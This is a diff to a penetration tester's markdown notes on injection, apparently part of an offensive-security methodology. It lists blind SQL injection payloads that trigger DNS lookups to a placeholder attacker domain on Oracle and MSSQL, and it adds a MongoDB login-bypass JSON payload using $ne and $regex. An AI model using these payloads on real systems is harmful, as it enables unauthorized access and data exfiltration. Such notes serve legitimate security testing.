@@ -39,7 +39,8 @@
 - MySql / MariaDB - `sleep(10)`
 
 ### DNS Lookup (Blind Injection)
-*Exploit [[3. Methodology/3.2 Exploitation/SQL Injection#DNS with Data Exfiltration]]*
+*Exploit [[3. Methodology/3.2 Exploitation/SQL Injection#DNS with Data Exfiltration]]
+
 - Oracle (v11.2.0.3 - v12.1.0.2) - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "<URL>/"> %remote;]>'),'/l') FROM dual`
 - Oracle (Elevated privileges) - `SELECT UTL_INADDR.get_host_address('<DOMAIN>')`
 - Microsoft - `exec master..xp_dirtree '//<DOMAIN>/a'`
@@ -48,5 +49,13 @@
 
 
 # MongoDB
-** Safe from traditional attacks, from building a BSON object, instead of assembling a query from string **
-** Look for JSON requests **
+**Set Content-Type to `application/json`**
+```
+{
+	"user": "user",
+	"password": {
+		"$ne": "blah",
+		"$regex": ".**"
+	}
+}
+```
